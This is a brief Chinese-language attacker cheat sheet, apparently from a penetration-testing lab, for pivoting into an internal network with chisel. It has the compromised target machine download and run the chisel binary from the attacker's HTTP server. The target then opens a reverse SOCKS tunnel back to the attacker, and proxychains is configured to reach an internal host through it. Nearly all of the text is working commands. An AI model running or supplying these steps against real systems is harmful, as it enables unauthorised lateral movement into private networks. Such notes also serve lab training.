攻击:
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz

gunzip chisel_1.8.1_linux_amd64.gz
chmod +x chisel_1.8.1_linux_amd64

python3 -m http.server 8000

靶机:
wget http://192.168.168.10:8000/chisel_1.8.1_linux_amd64   这里记得换攻击机ip
chmod +x chisel_1.8.1_linux_amd64

攻击机:
ctrl+c 暂停8000端口监听
./chisel server -p 18080 --reverse
sudo apt install proxychains

在/etc/proxychains.conf文件最后一行写: socks5 127.0.0.1 1080
如果前面有socks3 socks4的话要把socks3 socks4 删除

靶机:
./chisel_1.8.1_linux_amd64 client 192.168.168.10:18080 R:socks

攻击:
proxychains curl http://192.170.84.3